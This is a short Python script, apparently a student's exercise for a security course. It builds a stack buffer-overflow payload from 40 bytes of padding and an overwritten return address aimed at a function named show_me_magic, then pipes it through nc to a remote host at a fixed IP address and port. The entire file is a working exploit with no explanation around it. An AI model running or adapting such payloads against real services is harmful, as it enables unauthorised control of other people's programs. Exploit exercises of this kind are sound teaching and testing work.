# -*- coding: utf-8 -*-
"""
Created Date: 2023/10/17
Project: 01
Author: 1chooo (Hugo ChunHo Lin)
Student Number: 109601003
"""

import subprocess
from pwn import *

def p64(n):
    return n.to_bytes(8, byteorder='little')

# 創建 payload
junk = b'a' * 40
show_me_magic = 0x0000000000400627
payload = junk + p64(show_me_magic)

# 將 payload 寫入臨時文件
with open('payload.bin', 'wb') as f:
    f.write(payload)

# 使用 cat 和管道將 payload 發送到 nc
cmd = f'cat payload.bin | nc 140.115.59.7 10000'

# 執行命令
subprocess.call(cmd, shell=True)


